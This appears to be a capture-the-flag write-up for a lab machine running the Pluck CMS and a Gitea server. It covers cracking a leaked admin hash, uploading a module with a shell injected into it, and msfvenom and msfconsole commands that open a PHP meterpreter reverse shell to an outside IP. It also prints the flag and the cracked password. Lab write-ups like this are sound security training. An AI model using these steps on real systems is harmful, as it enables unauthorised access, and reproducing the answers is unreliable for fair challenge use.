## Exploit Summary

### Port 80
- **Service:** Pluck application
- **Initial Analysis:** No immediate exploit found

### Port 3000
- **Service:** Git repository server powered by Gitea
- **Findings:** Repository of the application on port 80

### Repository Analysis
- **File:** `pass.php`
- **Hash Found:** `d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163`
- **Hash Type:** SHA-512
- **Plaintext String:** `iloveyou1`
- **Possible Use:** Master admin password

### Exploitation Steps

1. **Login to Pluck Platform:**
   - Used `iloveyou1` to login as admin.

2. **Module Upload:**
   - Downloaded a test module.
   - Injected a shell into the module.
   - Uploaded the module to gain access as `www-data` user.

3. **Privilege Escalation:**
   - **User Flag:**
     - Found `user.txt` in `/home/junior`, but lacked read permission.

4. **Backdoor Creation:**
   - **Msfvenom:**
     ```shell
     msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=9001 -f raw -o shell.php
     ```
   - **Msfconsole:**
     ```shell
     set LHOST 10.10.14.27
     set LPORT 9001
     set PAYLOAD php/meterpreter/reverse_tcp
     exploit
     ```
   - **Execution:**
     - Accessed: `http://greenhorn.htb/data/modules/simple/shell.php`
     - Successfully executed the backdoor exploit.

### Post Exploitation

- **Recon:**
  - **Metasploit Local Exploit Suggester:**
    - Command: `multi/recon/local_exploit_suggester`
    - Result: No useful exploits found.
  - **LinPEAS Script:**
    - Ran the script, but no valuable information was found.

- **User Privilege Escalation:**
  - Used Pluck admin password (`iloveyou1`) to switch to `junior` user:
    ```shell
    su - junior
    ```
  - Successfully switched to `junior` user.

- **Retrieve User Flag:**
  - Command:
    ```shell
    cd /home/junior
    cat user.txt
    ```
  - User flag: `6a726a101baa431fced0240a747825af`
